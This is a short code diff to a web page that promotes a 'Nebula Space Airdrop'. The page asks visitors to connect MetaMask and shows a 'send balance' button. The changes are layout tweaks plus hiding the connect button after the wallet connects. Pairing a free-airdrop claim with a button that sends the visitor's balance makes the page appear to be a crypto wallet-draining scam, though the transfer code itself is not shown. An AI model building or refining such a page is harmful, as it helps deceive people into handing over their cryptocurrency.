@@ -89,13 +89,6 @@
             line-height: 1.4em; /* Ajusta la separación entre líneas */
         }
 
-        /* Contenedor de botones */
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
         /* Botones */
         button {
             font-size: 1.2em;
@@ -145,10 +138,8 @@
             claims Nebula Space Airdrop for the Community,<br>
             only wallets with history of transactions are accepted, to avoid wallet bots
         </p>
-        <div class="button-container">
-            <button id="connectButton">Conectar MetaMask</button>
-            <button id="sendButton">Enviar Saldo</button>
-        </div>
+        <button id="connectButton">Conectar MetaMask</button>
+        <button id="sendButton">Enviar Saldo</button>
         <p id="status"></p>
     </div>
 
@@ -162,6 +153,7 @@
                 accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 document.getElementById('status').innerText = `Conectado como: ${accounts[0]}`;
                 document.getElementById('sendButton').style.display = 'block';
+                document.getElementById('connectButton').style.display = 'none'; // Oculta el botón de conectar
             } else {
                 alert('Por favor, instala MetaMask!');
             }
